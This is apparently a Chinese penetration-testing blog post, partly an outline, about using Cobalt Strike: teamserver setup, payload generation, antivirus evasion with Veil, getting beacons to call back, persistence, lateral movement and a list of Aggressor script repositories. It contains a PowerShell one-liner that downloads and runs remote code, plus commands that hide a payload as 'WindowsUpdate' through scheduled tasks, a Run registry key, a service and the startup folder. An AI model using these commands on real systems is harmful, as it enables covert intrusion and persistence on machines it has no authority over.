---
layout: post
title:  "一篇文章深入理解CobaltStrike"
categories: 渗透测试
tags: 内网渗透 CobaltStrike
author: 0e0w

---

* content
{:toc}
这是一篇关于Cobalt Strike的的文章。由于作者能力有限，文中难免会出现一些错误，请谅解。本文会不定期更新，最近一次更新时间为2020年5月10日。

> 关于Cobalt Strike是什么？详见 [cobaltstrike](https://www.cobaltstrike.com/)官网。

## 0x01 基础用法

- 基础操作

  - 安装环境
    - 服务端 apt-get install jdk
    - sudo apt-get install openjdk-9-jre openjdk-9-jdk
  - 修改服务端口
    - vi teamserver &&--> server_port=63908
  - 修改指纹
    - vi teamserver &&--> CN=aa, OU=bb, O=cc, L=dd, S=ee, C=ff
  - 监听器端口
    - http 6059
  - HTTPS上线
    - 

- 运行：
  
  - 服务端：nohup ./teamserver ip passwd0e0w  &
  - 客户端运行后通过IP密码连接。
  - 服务端在阿里云下比较稳定，在腾讯云上经常掉..
  - 低调上线
    - 域名上线
    - 免费cdn
  
- 监听器
  
  - beacon
  - 内置监听器
  - foreign
    - 派生监听器
  
- 生成payload
  
  - Cobalt Strike ->Listeners ->Add ->Beacon HTTP ->......
- Attacks ->Packages ->Payload Generator ->......
  
- 上线：
  - 在靶机中执行生成的payload之后，不出意外即可上线。
  - 常见的执行payload方式？
  - 上线之后，可以设置sleep值方便快速回显。无操作时建议将sleep值调大一些。

- beacon

  beacon是CS自带的命令，下面列举了这些常见的使用方法。

  - shell 可以执行cmd命令
  - 

## 0x02 免杀基础

生成一个免杀的payload在后渗透测试过程中尤为重要。由于免杀框架层出不穷现在的免杀也相比过去容易了很多。

- Veil
  - CS Payload Generator中生成Veil的Payload.txt
  - Docker 运行Veil
  - docker pull mattiasohlsson/veil
    - docker run -it -v /root/Desktop/tools/veil:/var/lib/veil/output:Z mattiasohlsson/veil
    - use 1 
    - use 17
    - generate
    - 3
    - 复制CS VeilPayload.txt
    - 参考 https://xz.aliyun.com/t/4191
- shellcode
  - 
- Powershell
- 参考链接
  - https://www.t00ls.net/viewthread.php?tid=54993
  - https://www.t00ls.net/viewthread.php?tid=55754
  - https://www.t00ls.net/viewthread.php?tid=51321
  - https://github.com/darkr4y/geacon
  - https://www.t00ls.net/thread-55958-1-1.html
  - https://www.freebuf.com/articles/system/227463.html
  - [https://wtfsec.org/posts/%E5%85%8D%E6%9D%80shellcode%E5%B9%B6%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%90%AF%E5%8A%A8/](https://wtfsec.org/posts/免杀shellcode并绕过杀毒添加自启动/)
  - [https://wtfsec.org/posts/%e5%85%8d%e6%9d%80-msf-windows-payload-%e7%9a%84%e6%96%b9%e6%b3%95%e4%b8%8e%e5%ae%9e%e8%b7%b5/](https://wtfsec.org/posts/免杀-msf-windows-payload-的方法与实践/)
  - [https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6/](https://3gstudent.github.io/3gstudent.github.io/通过.NET实现内存加载PE文件/)
  - 

## 0x03 上线思考

如何上线？上线的分类有哪些？执行一条命令？运行一个可安装程序？

- Linux上线
  - Linux如何上线？
  - http://blog.leanote.com/post/snowming/c34f9defe00c

- 上线通知
  - https://www.t00ls.net/viewthread.php?tid=51487

- 打开文件
  - 可执行文件
  - 文件捆绑
- 执行命令
  - powershell
    - powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://ip:91/a'))"
    - http://ip:92/SiteLoader
    - http://ip/mPlayer
    - 参考：https://www.t00ls.net/viewthread.php?tid=52638
- cmd
    - mshta
  
- 注册表
- dll劫持

- https://kevien.github.io/2020/04/05/cobaltstrike-dns-beacon/

- 上线提醒
  - 微信提醒：http_ftqq.cna
  - ./agscript ip 50050 teste passwd0e0w /root/cobaltstrike4.0-cracked/http_ftqq.cna
  - 邮箱提醒：

## 0x04 权限维持

获取到一个Session之后，可能会由于网络不稳定，机器重启等操作丢失Session。我们获取一个Session之后，首先要思考的就是如何使Session永久维持。除了思考永久停留的问题之外，还需要及时的将Session备份到其他的CS服务器上面。本文列举了一些Session永久维持的方法，抛砖引玉。

- 永久停留

  本部分介绍了一些如何进行永久停留的方法，参考：https://xz.aliyun.com/t/5881

  - 计划任务
    - attrib C:\test.exe +s +h //隐藏文件
    - schtasks /create /tn WindowsUpdate /tr “C:\test.txt” /sc minute /mo 1
    - schtasks /delete /tn WindowsUpdate //删除计划任务
  - 注册表
    - reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "C:\test.exe" /f
  - shift后门
  - Windows服务
    - sc create "WindowsUpdate" binpath= "cmd /c start C:\test.exe";
    - sc config "WindowsUpdate" start= auto
    - net start WindowsUpdate
  - 自启目录
    - copy "C:\test.exe" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe" /y
    - attrib "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe" +s +h

- 备份Session
  
  - 

## 0x05 内网渗透

内网渗透中，使用一些神洞进行。这些渗透往往是内网之中的大杀器。其中包括下面的这些神洞。除了这些神洞之外，在内网中总是会存在大量的弱口令，内网中弱口令扫描也尤为重要。同样，在内网中可能会存在大量服务器使用相同复杂密码的情况，因此密码嗅探也是比较有效的操作。

除此之外，在内网中横向渗透时，优先考虑使用msf。

- 主机神洞
  - MS17-010

- 中间件神洞
  - Weblogic

- 密码破解
  - ssh弱口令
  - rdp弱口令
  - 数据库弱口令

- 密码抓取

## 0x06 流量转发

获取到一些服务器之后，为了测试的必要性可能需要把流量转发出来。当然，这可能是不必要的。进入内网横向渗透测试时

- pivoting
  - https://blog.csdn.net/qq_26091745/article/details/104045090

## 0x06 CS Script

Cobalt Strike作为一款优秀的后渗透测试框架，可扩展性也极强。用户可以通过编写Cobalt Strike Script的方式新增功能。再此列举了一些比较优秀的Script。

- [Ladon](https://github.com/k8gege/Ladon)
- https://github.com/QAX-A-Team/EventLogMaster
- [https://github.com/rsmudge/ElevateKit](https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikejiao-ben-shi-yong.html#)
- [https://github.com/vysec/CVE-2018-4878](https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikejiao-ben-shi-yong.html#)
- https://github.com/harleyQu1nn/AggressorScripts
- https://github.com/bluscreenofjeff/AggressorScripts
- https://github.com/ramen0x3f/AggressorScripts
- https://github.com/360-A-Team/CobaltStrike-Toolset
- https://github.com/ars3n11/Aggressor-Scripts
- https://github.com/michalkoczwara/aggressor_scripts_collection
- https://github.com/vysec/Aggressor-VYSEC
- https://github.com/killswitch-GUI/CobaltStrike-ToolKit
- https://github.com/ZonkSec/persistence-aggressor-script
- https://github.com/ramen0x3f/AggressorScripts
- https://github.com/rasta-mouse/Aggressor-Script
- https://github.com/RhinoSecurityLabs/Aggressor-Scripts
- https://github.com/Und3rf10w/Aggressor-scripts
- https://github.com/Kevin-Robertson/Inveigh
- https://github.com/Genetic-Malware/Ebowla
- https://github.com/001SPARTaN/aggressor_scripts
- https://github.com/gaudard/scripts/tree/master/red-team/aggressor
- https://github.com/branthale/CobaltStrikeCNA
- https://github.com/oldb00t/AggressorScripts
- https://github.com/p292/Phant0m_cobaltstrike
- https://github.com/p292/DDEAutoCS
- https://github.com/secgroundzero/CS-Aggressor-Scripts
- https://github.com/skyleronken/Aggressor-Scripts
- https://github.com/tevora-threat/aggressor-powerview
- https://github.com/tevora-threat/PowerView3-Aggressor
- https://github.com/threatexpress/aggressor-scripts
- https://github.com/threatexpress/red-team-scripts
- https://github.com/threatexpress/persistence-aggressor-script
- https://github.com/FortyNorthSecurity/AggressorAssessor
- https://github.com/mdsecactivebreach/CACTUSTORCH
- https://github.com/C0axx/AggressorScripts
- https://github.com/offsecginger/AggressorScripts
- https://github.com/tomsteele/cs-magik
- https://github.com/bitsadmin/nopowershell
- https://github.com/SpiderLabs/SharpCompile
- https://github.com/SpiderLabs/SharpCompile
- https://github.com/realoriginal/reflectivepotato

## 0x99 参考链接

- https://github.com/TideSec/BypassAntiVirus

- https://github.com/alphaSeclab/cobalt-strike

- http://blog.leanote.com/post/snowming/de88219734d1

- https://kevien.github.io/2020/04/05/cobaltstrike-dns-beacon/